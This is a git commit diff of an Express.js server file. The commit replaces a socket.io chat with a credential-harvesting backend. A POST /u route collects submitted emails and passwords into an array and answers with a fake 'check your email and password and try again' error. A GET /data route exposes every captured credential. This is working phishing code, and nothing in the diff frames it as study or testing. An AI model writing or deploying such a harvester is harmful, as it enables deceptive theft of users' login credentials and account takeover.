878c00102d04eda4f01c585b6dc1b1c861aa9784
mianumer116 <128652547+mianumer116@users.noreply.github.com>
2024-06-07 17:58:08 +0500

    c

--- index.js
+++ index.js
@@ -3,28 +3,44 @@ const express = require('express');
 const app = express();
 const path = require('path');
 const server = http.createServer(app);
-const { Server } = require('socket.io');
-const io = new Server(server);
 
+const data=[]
+app.use(express.json())
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.resolve("./public")));
 
 app.get('/', function(req, res) {
+    try{
+
+    
     return res.sendFile(path.join(__dirname, '/public/index.html'));
+    }catch(error){
+        res.send(error)
+    }
 });
 
-app.get('/umer', function(req, res) {
-    res.render('form'); // Assuming you have a template engine configured for rendering
-});
+app.post('/u',function(req,res){
+    try{
 
+    
+    const {email,password}=req.body;
+    data.push(email,password)
+    res.send({message:"CHECK YOUR EMAIL AND PASSWORD AND TRY AGAIN"})
+    }catch(error){
+        res.send(error)
+    }
+})
+
+app.get('/data',function(req,res){
+    try{
+
+        res.send(data)
+    }catch(error){
+        res.send(error)
+    }
+})
 // Socket.io
-io.on('connection', function(socket) {
-    socket.on('user-message', function(message) {
-        io.emit("message", message);
-    });
-});
-
 const port = process.env.PORT || 3000;
-
 server.listen(port, function() {
     console.log("Server is listening on port " + port);
 });
